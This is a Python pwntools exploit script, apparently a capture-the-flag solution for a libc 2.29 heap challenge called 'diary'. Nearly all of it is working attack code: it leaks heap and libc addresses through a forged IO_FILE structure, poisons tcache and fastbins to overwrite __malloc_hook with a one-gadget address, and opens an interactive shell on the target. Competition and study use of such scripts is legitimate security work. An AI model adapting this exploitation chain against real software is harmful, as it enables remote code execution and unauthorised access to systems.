#!/usr/bin/python3
from pwn import *
from IO_FILE import *
from past.builtins import xrange
from time import sleep
from subprocess import check_output
import random

#Utils
def writediary(diarylen,content,drop=False,ok=False,shell=False):
	if drop==True:
		if ok==False:
			io.send('\n')
		sleep(.05)
		io.sendline('2')
		sleep(.05)
		io.sendline()
		sleep(.05)
		io.sendline(str(diarylen))
		sleep(.05)
		io.send(content)
	else:
		io.sendafter('choice : ','2')
		io.sendafter('Diary Length : ',f'{diarylen}')
		if shell==True: return 0
		io.sendafter('Diary Content : ',content)

def readdiary(idx, data=None,ok=False, drop=False,seconds=0.05):
	if drop == False:
		io.sendlineafter('choice : ', '3')
		io.sendlineafter('Page : ', str(idx))
	else:
		
		if ok==False:
			io.send('\n')
	#	pause()
		sleep(seconds)	
		io.sendline('3')
		sleep(seconds)
	#	pause()
		io.send('\n')
		sleep(seconds)
	#	pause()
		io.sendline(str(idx))
		sleep(seconds)
		io.send(data)

def editdiary(pageno,content):
	io.sendafter('choice : ','4')
	io.sendafter('Page : ',f'{pageno}')
	io.sendafter('Content : ',content)

def teardiary(pageno,ok=False,drop=False):
	if drop==False:
		io.sendafter('choice : ','5')
		io.sendafter('Page : ',f'{pageno}')
	else:
		if ok==False:
			io.send('\n')
		sleep(.05)
		io.sendline('5')
		sleep(.05)
		io.send('\n')
		sleep(.05)
		io.send(str(pageno))

def viewname(newname,ok=True):
	if ok==True:
		io.send('1')
		sleep(.05)
		io.send(newname)
	else:
		sleep(.05)
		io.send('\n')
		sleep(.05)
		io.send('1')
		sleep(.05)
		io.send(newname)

def getpid(process_name):
	s = str(subprocess.check_output(['pidof',process_name]))[2:]
	pid = ''
	for each in s:
		if each != ' ' and each != '\\':
			pid += each
		else:
			break
	return int(pid)

# libc 2.29
#libc = ELF('./libc-2.29.so',checksec=False)
_IO_file_jumps = 0x1e6560
__malloc_hook = 0x1e4c30

# Exploit
while True:
#	io = process('./diary',env={'LD_PRELOAD':libc.path})
#	io = remote('localhost',31337)
#	while True:
#		io = remote('localhost', 31337)
#		pid = getpid('diary')
#		maps = open(f'/proc/{pid}/maps', 'r')
#		data = maps.read(570)
#		stdout = hex(int('0x' + maps.read(12), 0) + 0x3b2760)
#		n = stdout[-4:][0]
#		if n=='9':
#			break
#		else:
#			io.close()
#			continue
        #io = remote('diary.balsnctf.com',10101)
		io = remote('localhost',10101)
		io.sendafter('name : ','A'*0x20)
		writediary(0x80,'HK'*(0x80//2)) #0 Corrupting chunk
		writediary(0x80,'HK') #1
		writediary(0x80,'HK') #2 #This will later go into unsortedbin
		writediary(0x64,'HK') #3 This will go into tcache bin.
		writediary(0x64,p32(0)+p64(0)*10+p64(0x71)) #4 fastbins
		writediary(0x64,'HK') #5 fastbins

		teardiary(1) #delete diary 1 to set tcache idx - 1 ( size 0x90 ) This is used later in exploit.
		teardiary(3) #delete diary 3 to set tcache idx - 1 ( size 0x70 ).

		io.sendafter('choice : ','1')	
		heap_base = u64(io.recvline().strip()[0x20:].ljust(8,b'\0'))-0x260
		print(hex(heap_base))

		_IO_FILE = IO_FILE_plus(arch=64)
		f_stream = _IO_FILE.construct(flags=0xfbad3887,
					fileno=0x1,lock=heap_base+0x48)[0x4:0xc8]+\
					p64(0x73)+\
					p64(0)+\
					b'\x98'
		editdiary(-8,f_stream)
		sleep(.05)
		io.send('A')
		viewname(b'B'*0x20+p64(heap_base+(0x17-0x4))[0:6])
		readdiary(0,'\7',drop=True,ok=False) #Set tcache idx to 7
		sleep(.05)
		io.send('A')
		viewname(b'C'*0x20+p64(heap_base+(0x15-0x4))[0:6])
		readdiary(0,'\7',drop=True,ok=False) #set tcache idx to 7
		teardiary(2,drop=True)
		teardiary(4,drop=True)
		sleep(.05)
		teardiary(5,drop=True)
		sleep(2)
		io.sendline('A')	
		viewname(b'A'*0x20+p64(heap_base+(0x380-0x4))[0:6])
		readdiary(0,'\x20\xc8',drop=True,ok=False)	
		sleep(1)
		io.send('A')
		viewname(b'D'*0x20+p64(heap_base+(0x378 - 0x4))[0:6])
		readdiary(0,'\x71',drop=True,ok=False)	
		sleep(.05)
		io.send('A')
		viewname(b'A'*0x20+p64(heap_base+(0x4f0-0x4))[0:6])	
		sleep(.05)
		readdiary(0,p64(heap_base+0x370)[0:6],drop=True,ok=False)
		sleep(.05)
		writediary(0x64,p32(0x0)+p64(0)*10+p64(0x11),drop=True,ok=False) #6
		writediary(0x64,'HKHK',drop=True,ok=False) #7
	#	pause()
		sleep(.05)
		viewname(b'A'*0x20+p64(heap_base+0x4e0)[0:6],ok=False)
		sleep(.05)
		try:
			writediary(0x64,p32(0xffffffff)+b'\x60',drop=True,ok=False) #8
			input('>')
			readdiary(8)
			libc_leak = u64(io.recvline().strip()[4:].ljust(8,b'\0'))
			libc_base = libc_leak - _IO_file_jumps
			if libc_base&0xfff==0:
				print('FUCK YES')
		except:
			io.close()
			continue
		print(hex(libc_base))	
		teardiary(6)
		teardiary(0)
		writediary(0x64,p32(0)+p64(0x71)+p64(libc_base+__malloc_hook-0x23)) #9
		writediary(0x64,'HK') #10
		writediary(0x64,b'A'*(0x23-0x14) + p64(libc_base+0x106ef8)) #11
		writediary(0x41,'RIP',shell=True) #12
		io.interactive()
